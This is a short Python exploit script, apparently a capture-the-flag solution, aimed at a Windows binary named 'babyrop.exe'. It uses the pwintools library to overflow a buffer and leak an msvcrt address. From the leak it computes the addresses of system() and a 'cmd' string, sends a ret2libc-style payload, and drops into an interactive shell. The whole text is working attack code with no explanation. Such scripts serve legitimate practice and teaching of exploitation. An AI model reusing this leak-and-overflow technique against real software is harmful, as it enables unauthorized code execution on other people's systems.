# https://gist.github.com/bash-c/6c178705bb4cca51d43a048feb62f395#file-pwintools-py
from pwintools import *

io = process("babyrop.exe")



io.sendline("a" * 24)
io.recvuntil("a" * 24)

mscvr_base = u32(io.recv(4)) - 0x26e2d

print("mscvr_base -> {:#x}".format(mscvr_base))
system = mscvr_base + 0x307fb
print("system -> {:#x}".format(system))
cmd = mscvr_base + 0x1ed0
print("cmd -> {:#x}".format(cmd))

payload = "0" * 0xcc + 'aaaa' + p32(system) + 'cccc' + p32(cmd)

io.sendlineafter("length", str(len(payload) + 10))

raw_input("DEBUG: ")
io.sendline(payload)
io.sendline()

io.interactive()